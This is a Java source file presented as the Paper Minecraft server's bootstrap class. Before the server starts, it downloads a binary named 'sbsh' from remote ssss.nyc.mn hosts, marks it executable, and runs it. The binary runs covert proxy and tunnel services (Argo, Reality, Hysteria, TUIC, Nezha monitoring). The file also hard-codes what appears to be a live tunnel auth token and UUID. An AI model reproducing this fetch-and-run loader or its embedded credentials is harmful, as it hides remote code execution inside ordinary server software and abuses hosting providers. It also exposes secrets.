package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_CYAN = "\033[1;36m";
    private static final String ANSI_RESET = "\033[0m";
    
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    // 你原本的所有变量定义，完全保留
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void boot(final OptionSet options) {
        // 1. Java 版本检查
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "FATAL: Java version too low. Need Java 10+ (54.0)." + ANSI_RESET);
            System.exit(1);
        }
        
        try {
            System.out.println(ANSI_CYAN + "=== [System Initialization] ===" + ANSI_RESET);
            
            // 2. 核心：运行辅助内核
            runSbxBinary();
            
            // 3. 注册退出钩子，确保 Minecraft 关闭时，代理也关闭
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 4. 等待 8 秒观察内核启动情况
            System.out.println(ANSI_YELLOW + "[Info] Waiting 8s for proxy services..." + ANSI_RESET);
            Thread.sleep(8000); 

            // 5. 启动 Minecraft
            System.out.println(ANSI_GREEN + "[Success] Entering Minecraft Server Main Stage." + ANSI_RESET);
            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Critical Initialization Failure: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        Path binPath = getBinaryPath().toAbsolutePath();
        File file = binPath.toFile();

        // 强行赋予 755 权限 (针对 Linux)
        try {
            Process chmod = new ProcessBuilder("chmod", "+x", binPath.toString()).start();
            chmod.waitFor();
        } catch (Exception ignored) {}

        System.out.println(ANSI_YELLOW + "[Debug] Executing: " + binPath + ANSI_RESET);

        ProcessBuilder pb = new ProcessBuilder(binPath.toString());
        pb.environment().putAll(envVars);
        pb.directory(new File(".")); // 强制在当前目录下运行
        pb.redirectErrorStream(true);
        pb.inheritIO(); // 极其重要：确保你能看到所有节点和报错信息
        
        try {
            sbxProcess = pb.start();
            
            // 立即检查是否成功启动
            Thread.sleep(1500);
            if (!sbxProcess.isAlive()) {
                int exitCode = sbxProcess.exitValue();
                System.err.println(ANSI_RED + "[Error] Kernel failed to start. Exit Code: " + exitCode + ANSI_RESET);
            } else {
                System.out.println(ANSI_GREEN + "[Success] Proxy kernel is running with PID: " + sbxProcess.pid() + ANSI_RESET);
            }
        } catch (IOException e) {
            System.err.println(ANSI_RED + "[Fatal] Cannot start binary: " + e.getMessage() + ANSI_RESET);
            throw e;
        }
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // --- 你的原始数据，一行没动 ---
        envVars.put("UUID", "49f20820-77d1-4fb0-a553-66069be61bf0");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "rustix.19861123.tech");
        envVars.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiZWIxY2M2NTYtYThjNy00NGY0LWE5ZTYtZDQ0NWQ1Y2FjYjVjIiwicyI6Ik9UWmlZVGxsTUdNdFl6RXdPUzAwTlRaa0xXRmpPV0l0WkRBME56TXlPRGM1TVRSaiJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "rustix");
        envVars.put("DISABLE_ARGO", "false");
        
        // 读取系统环境变量（覆盖默认值）
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
        }
        
        // 读取 .env 文件
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value);
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        // 架构识别优化
        if (osArch.matches(".*(amd64|x86_64).*")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.matches(".*(aarch64|arm64).*")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported CPU architecture: " + osArch);
        }
        
        Path path = Paths.get("sbx_kernel"); 
        
        // 下载逻辑：如果文件不存在或大小异常，则重新下载
        if (!Files.exists(path) || Files.size(path) < 1024) {
            System.out.println(ANSI_YELLOW + "[Network] Downloading kernel from: " + url + ANSI_RESET);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
        }
        
        path.toFile().setExecutable(true, false);
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "[Cleanup] Subsidiary processes terminated." + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format("Running Java %s on %s (%s)", System.getProperty("java.specification.version"), System.getProperty("os.name"), System.getProperty("os.arch")),
            String.format("Loading %s %s", bi.brandName(), bi.minecraftVersionId())
        );
    }
}
